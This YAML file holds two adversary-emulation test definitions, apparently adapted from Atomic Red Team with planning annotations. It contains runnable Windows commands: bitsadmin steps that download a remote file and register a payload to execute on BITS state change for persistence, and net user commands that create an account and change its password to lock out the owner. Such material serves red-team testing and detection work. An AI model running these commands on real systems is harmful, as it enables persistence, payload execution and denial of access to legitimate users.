- uuid: art-t1197-bits-notifycmdline
  name: Persist, Download, & Execute
  id:
  - T1197
  source: Atomic Red Team
  supported_platforms:
  - windows
  tactics:
  - Persistence
  - Defense Evasion
  technique:
  - BITS Jobs
  description: |
    Abuses BITS `/setnotifycmdline` to trigger a command whenever the
    BITS transfer state changes — the transfer is used as a persistence
    vehicle (the notify command fires under the BITS service context).
    Original ART hardcodes notepad.exe as the notify command; parameterised.
    ART auto_generated_guid 62a06ec5-5754-47d2-bcfc-123d8314c6ae.
  execution:
    executor: Command Prompt Executor
    command: |
      bitsadmin.exe /create "#{bits_job_name}"
      bitsadmin.exe /addfile "#{bits_job_name}" "#{remote_file}" "#{local_file}"
      bitsadmin.exe /setnotifycmdline "#{bits_job_name}" "#{command_path}" NULL
      bitsadmin.exe /resume "#{bits_job_name}"
      ping -n 5 127.0.0.1 >nul 2>&1
      bitsadmin.exe /complete "#{bits_job_name}"
  arguments:
    executor:
      description: The Command Prompt session ID used to invoke bitsadmin.
      required: true
      pddl_index: executor4_var_in_plan
    bits_job_name:
      default: AtomicBITS
      description: BITS job name.
      required: true
    remote_file:
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
      description: URL of a file for BITS to download (payload delivery vehicle).
      required: true
    local_file:
      default: C:\Users\Public\bits_download.dat
      description: Target-side destination for the BITS download.
      required: true
    command_path:
      default: C:\Users\Public\payload.exe
      description: Command invoked via `/setnotifycmdline` on BITS state change.
      required: true
      pddl_index: string2_var_in_plan
  preconditions:
  - (os-windows ?target - host)
  - (command-prompt ?executorID - executor ?target - host)
  effects:
  - (command-execution-at-event ?c - string ?target - host)
- uuid: art-t1531-change-password
  name: Change User Password - Windows
  id:
  - T1531
  source: Atomic Red Team
  supported_platforms:
  - windows
  tactics:
  - Impact
  technique:
  - Account Access Removal
  description: |
    Creates a target account (if absent) then rotates its password to a
    value only the attacker knows — the legitimate owner is locked out.
    Classic post-compromise "revoke owner's access" impact pattern. ART
    auto_generated_guid 1b99ef28-f83c-4ec5-8a08-1a56263a5bb2.
  execution:
    executor: Command Prompt Executor
    command: |
      net user #{user_account} #{initial_password} /add
      net.exe user #{user_account} #{new_password}
  arguments:
    executor:
      description: The Command Prompt session ID used to invoke net.
      required: true
      pddl_index: executor4_var_in_plan
    user_account:
      default: AtomicAdministrator
      description: Local user whose password will be rotated (created if absent).
      required: true
    initial_password:
      default: User2ChangePW!
      description: Initial password if the account has to be created first.
      required: true
    new_password:
      default: HuHuHUHoHo283283@dJD
      description: New password that replaces the original — attacker-only.
      required: true
  preconditions:
  - (os-windows ?target - host)
  - (command-prompt ?executorID - executor ?target - host)
  - (elevated-executor ?executorID - executor)
  effects:
  - (user-disabled ?target - host)
